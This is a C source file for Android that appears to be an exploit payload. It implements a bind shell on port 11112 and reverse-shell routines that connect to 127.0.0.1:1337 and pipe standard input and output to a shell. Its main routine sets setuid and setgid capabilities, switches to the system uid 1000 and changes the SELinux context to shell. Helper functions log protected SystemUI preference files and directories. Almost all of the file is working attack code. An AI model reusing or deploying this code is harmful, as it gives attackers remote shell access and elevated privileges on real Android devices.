#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/capability.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <cutils/properties.h>
//#include <selinux/selinux.h>
#include <dlfcn.h>
#include <stdlib.h>
#include "lsh.h"

#include <android/log.h>
#define ALOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define LOG_TAG "findfiles"


#define HOST_NAME "app_process32"
#define CONTEXT_APP "u:r:platform_app:s0:c512,c768"
#define CONTEXT_ZYG "u:r:zygote:s0"
#define CONTEXT_SYS "u:r:system_server:s0"
#define CONTEXT_SHL "u:r:shell:s0"
#define DATAXML "/data/data/com.android.systemui/shared_prefs/com.android.systemui.xml"
#define NEWXML "/data/local/tmp/com.android.systemui.xml"
#define DATADIR "/data/data/com.android.systemui/files"
#define THEID 1000

int sleeper_shell() {
    ALOG("About to fork a shell");

    int resultfd, sockfd;
    int port = 11112;
    struct sockaddr_in my_addr;

    // syscall 102
    // int socketcall(int call, unsigned long *args);

    // sycall socketcall (sys_socket 1)
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0)
    {
        ALOG("no socket\n");
        return 112;
    }
    // syscall socketcall (sys_setsockopt 14)
    int one = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    memset(&my_addr,0,sizeof(my_addr));
    // set struct values
    my_addr.sin_family = AF_INET; // 2
    my_addr.sin_port = htons(port); // port number
    my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

    // syscall socketcall (sys_bind 2)
    int bindret = bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
    if (bindret < 0) {
        ALOG("Failed to bind");
        return 113;
    }

    // syscall socketcall (sys_listen 4)
    int listenret = listen(sockfd, 0);
    if (listenret < 0 ){
        ALOG("Failed to listen");
        return 114;
    }

    // syscall socketcall (sys_accept 5)
    resultfd = accept(sockfd, NULL, NULL);
    if(resultfd < 0)
    {
        ALOG("no resultfd\n");
        return 115;
    }
    // syscall 63
    dup2(resultfd, 2);
    dup2(resultfd, 1);
    dup2(resultfd, 0);
    ALOG("ciao\n");
    // syscall 11
    lsh_loop();
}

void check_context(void) {
    typedef int (*_getcon_ptr)(char** context);
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    if (handle) {

        _getcon_ptr _getcon = dlsym(handle, "getcon");
        char *conn = 0;
        if (_getcon) {
            int ret = _getcon(&conn);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
            } else  {
                ALOG("Current Context: %s",conn);
            }
        }
    }
}

int set_context_new(const char* cont) {
    typedef int (*_setcon_ptr)(const char* context);
    typedef int (*_getcon_ptr)(char** context);
    printf("Read selinux.so");
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    printf("Done.");
    if (handle)
    {
        _getcon_ptr _getcon = dlsym(handle, "getcon");
        _setcon_ptr _setcon = dlsym(handle, "setcon");
        char *conn = 0;
        if (_getcon) {
            int ret = _getcon(&conn);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
                return 2;
            } else  {
                printf("Current context: %s\n",conn);
            }
        }



        if (_setcon)
        {
            int ret = _setcon(cont);
            if (ret) {
                printf("setcon error... %d\n", ret);
                return 2;
            } else {
                printf("setcon success!\n");
            }
        }
        else {
            printf("setcon() not found\n");
            return 2;
        }
        if (conn) {
            ALOG("Old Context WAS: %s",conn);
        }
        char *connNew = 0;
        if (_getcon) {
            int ret = _getcon(&connNew);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
                return 2;
            } else  {
                printf("Current context: %s\n",connNew);
            }
        }
        if (connNew) {
            ALOG("New Context  IS: %s",connNew);
        }

    }
    else {
        printf("libselinux.so not found\n");
        return 2;
    }

    return 0;
}


//int switch_context(void) {
//        int ret = 0;
//	char *conn = 0;
//	char *connNew = 0;
//
//	printf("Switching context");
//	ret = getcon(&conn);
//	if (ret) {
//		printf("Could not get current security context!\n");
//		return 1;
//	}
//
//	printf("Current selinux context:");
//        //printf(conn);
//
//	ret = setcon(CONTEXT_SYS);
//	if (ret) {
//		printf("Unable to set security context to '%s'!\n", CONTEXT_SYS);
//		return 1;
//	}
//	printf("Set context to '%s'\n", CONTEXT_SYS);
//
//	ret = getcon(&connNew);
//	if (ret) {
//		printf("Could not get current security context!\n");
//		return 1;
//	}
//
//	printf("Current security context: %s\n", connNew);
//
//	if (strcmp(connNew, CONTEXT_SYS)) {
//		printf("Current security context '%s' does not match '%s'!\n",
//			connNew, CONTEXT_SYS);
//		ret = EINVAL;
//		return 1;
//	}
//
//        if (conn) {
//            ALOG("Old selinux context: %s", conn);
//        }
//        if (connNew) {
//            ALOG("New selinux context: %s", connNew);
//        }
//        return ret;
//}
//
void start_sh(void) {
    int i; // used for dup2 later
    int sockfd; // socket file descriptor
    socklen_t socklen; // socket-length for new connections

    struct sockaddr_in srv_addr; // client address

    srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
    srv_addr.sin_port = htons( 1337 ); // connect-back port, converted to network byte order
    srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect-back ip , converted to network byte order

    // create new TCP socket
    sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

    // connect socket
    connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

    // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
    for(i = 0; i <= 2; i++)
        dup2(sockfd, i);

    // magic
    printf("Attempting to runlsh\n");
    execve( "/data/local/tmp/lsh", NULL, NULL);
    printf("failed :(\n");
}

int create_sh(void)
{
    printf("setting up sockets...\n");
    fflush(stdout);
    int i; // used for dup2 later
    int sockfd; // socket file descriptor
    socklen_t socklen; // socket-length for new connections

    struct sockaddr_in srv_addr; // client address

    srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
    srv_addr.sin_port = htons( 1337 ); // connect-back port, converted to network byte order
    srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect-back ip , converted to network byte order

    // create new TCP socket
    sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

    if (sockfd == -1) {
        return sockfd;
    }
    // connect socket
    int res = connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
    if (res == 0) {
        ALOG("connectinog workkrkerkekdkkdk");

        // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
        for(i = 0; i <= 2; i++)
            dup2(sockfd, i);

        // magic
        //printf("Attempting to runlsh\n");
        //fflush(stdout);
        //char *argv[] = {"/data/local/tmp/lsh", NULL};
        //execvp( "/data/local/tmp/lsh", argv);
        //printf("failed :(\n");
        //fflush(stdout);

        lsh_loop();
        ALOG("Lsh ended");
        return 0;
    }
    return res;
}

void create_a_socket() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0)
    {
        ALOG("faield to socket as zygote+random\n");
    } else {
        ALOG("can create a socket.");
        close(sockfd);
    }
    sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
    if(sockfd < 0)
    {
        ALOG("IP:faield to socket as zygote+random\n");
    } else {
        ALOG("IP:can create a socket.");
        close(sockfd);
    }
}

//FILE* fileNew;
        //if (fileNew = fopen(NEWXML, "r")) {
        //    fclose(fileNew);
        //    ALOG("Already created xml\n");
        //} else {
        //    int fd;
        //    if ((fd = open(NEWXML, O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO)) == -1) {
        //        close(fd);
        //        fileNew = fopen(NEWXML,"w");
        //        for (;;) {
        //            int c = fgetc(file);
        //            if ( c != EOF ) {
        //                fputc(c,fileNew);
        //            } else {
        //                break;
        //            }
        //          }
        //        fclose(fileNew);
        //        ALOG("Wrote copy of file");
        //    } else {
        //        ALOG("Failed to create %s",NEWXML);
        //    }
        //  }
int logfile(const char* fn) {
    FILE *file;
    size_t  size = 0;
    char* buffer = 0;
    if (file = fopen(fn, "r"))
    {
        ALOG("Can read %s\n",fn);
        
        fseek(file,0,SEEK_END);
        size = ftell(file);
        rewind(file);
        buffer = malloc((size+1)*sizeof(*buffer));
        fread(buffer, size, 1, file);
        buffer[size] = '\0';
        ALOG(buffer);
        free(buffer);
        fclose(file);
    } else {
        ALOG("FAILURE: no reado comprendo %s\n",fn);
        return 2;
    }
    return 0;
}

int logdir(const char* d) {
    DIR *dp;
    struct dirent *ep;
    dp = opendir(d);
    if (dp != NULL) {
        while (ep = readdir(dp)) {
            ALOG("\t%s.. %s", d, ep->d_name);
        }
        closedir(dp);
    } else {
        ALOG("Cannot read/open dir %s", d);
        return 2;
    }
    return 0;
}
int main(int argc, char **argv)
{

    struct __user_cap_header_struct capheader;
    struct __user_cap_data_struct capdata[2];

    printf("running as uid %d\n", getuid());
    fflush(stdout);

    memset(&capheader, 0, sizeof(capheader));
    memset(&capdata, 0, sizeof(capdata));
    capheader.version = _LINUX_CAPABILITY_VERSION_3;
    capdata[CAP_TO_INDEX(CAP_SETUID)].effective |= CAP_TO_MASK(CAP_SETUID);
    capdata[CAP_TO_INDEX(CAP_SETGID)].effective |= CAP_TO_MASK(CAP_SETGID);
    capdata[CAP_TO_INDEX(CAP_SETUID)].permitted |= CAP_TO_MASK(CAP_SETUID);
    capdata[CAP_TO_INDEX(CAP_SETGID)].permitted |= CAP_TO_MASK(CAP_SETGID);
    if (capset(&capheader, &capdata[0]) < 0) {
        printf("Could not set capabilities: %s\n", strerror(errno));
    }
    fflush(stdout);
    if(setresgid(THEID,THEID,THEID) || setresuid(THEID,THEID,THEID)) {
        printf("setresgid/setresuid failed\n");
    }
    printf("uid %d\n", getuid());
    ALOG("uid %d\n", getuid());
    
    check_context();
    int r1 = set_context_new(CONTEXT_SHL);
    check_context();

    //logfile(DATAXML);
    //logdir(DATADIR);

    fflush(stdout);
    lsh_loop();
    return 0;
}
